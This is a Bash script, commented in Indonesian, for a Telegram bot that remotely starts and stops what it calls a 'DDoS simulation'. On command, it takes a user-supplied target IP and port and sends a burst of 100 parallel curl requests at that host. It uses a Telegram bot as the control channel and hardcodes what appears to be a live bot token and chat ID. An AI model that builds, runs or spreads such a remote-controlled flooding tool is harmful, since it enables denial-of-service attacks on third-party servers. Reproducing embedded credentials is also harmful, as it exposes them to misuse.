#!/bin/bash

# Konfigurasi Bot Telegram
TOKEN="7959814478:AAFxppAPH-51WmjdBkD0YImDzOtFytz4WQI"
CHAT_ID="6971814222" # Ganti dengan ID Telegram Anda
OFFSET=0

# Fungsi untuk mengirim pesan dengan tombol keyboard
send_keyboard() {
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$1" \
        -d "reply_markup={\"keyboard\":[[\"🚀 Start DDoS\",\"🛑 Stop DDoS\"],[\"📊 Status\",\"📖 Help\"]],\"resize_keyboard\":true,\"one_time_keyboard\":true}"
}

# Fungsi untuk mengirim pesan biasa
send_message() {
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$1"
}

# Fungsi untuk memulai "Simulasi DDoS"
start_ddos() {
    send_message "🚀 Memulai Simulasi DDoS... Target IP: $TARGET_IP, Port: $TARGET_PORT"
    for i in {1..100}; do
        (curl -s "http://$TARGET_IP:$TARGET_PORT" > /dev/null 2>&1) &
    done
    echo "ddos_running" > ddos_status.log
}

# Fungsi untuk menghentikan DDoS
stop_ddos() {
    send_message "🛑 Menghentikan Simulasi DDoS..."
    pkill -f "curl -s"
    echo "ddos_stopped" > ddos_status.log
}

# Fungsi untuk status
status_ddos() {
    if [[ -f ddos_status.log ]]; then
        status=$(cat ddos_status.log)
        send_message "📊 Status DDoS: $status"
    else
        send_message "📊 Status DDoS: Tidak Ada Aktivitas"
    fi
}

# Fungsi bantuan
help_menu() {
    send_message "📖 Perintah Bot DDoS:\n🚀 Start DDoS: Memulai serangan simulasi\n🛑 Stop DDoS: Menghentikan serangan\n📊 Status: Cek status serangan\n📖 Help: Lihat panduan ini"
}

# Loop utama untuk memantau pesan
while true; do
    updates=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET")
    result=$(echo "$updates" | jq -r '.result[]')

    for row in $(echo "${result}" | jq -r '.update_id'); do
        OFFSET=$((row+1))
        message=$(echo "$result" | jq -r '.message.text')
        user_id=$(echo "$result" | jq -r '.message.chat.id')

        if [[ "$user_id" == "$CHAT_ID" ]]; then
            case "$message" in
                "🚀 Start DDoS") 
                    send_message "🌐 Masukkan Target IP:"
                    read -r TARGET_IP
                    send_message "🌐 Masukkan Target Port:"
                    read -r TARGET_PORT
                    start_ddos ;;
                "🛑 Stop DDoS") stop_ddos ;;
                "📊 Status") status_ddos ;;
                "📖 Help") help_menu ;;
                "/start") send_keyboard "🤖 Bot DDoS Siap! Pilih perintah dari menu:" ;;
                *) send_message "⚠️ Perintah tidak valid. Gunakan menu keyboard." ;;
            esac
        else
            send_message "⛔ Anda tidak diizinkan menggunakan bot ini."
        fi
    done

    sleep 2
done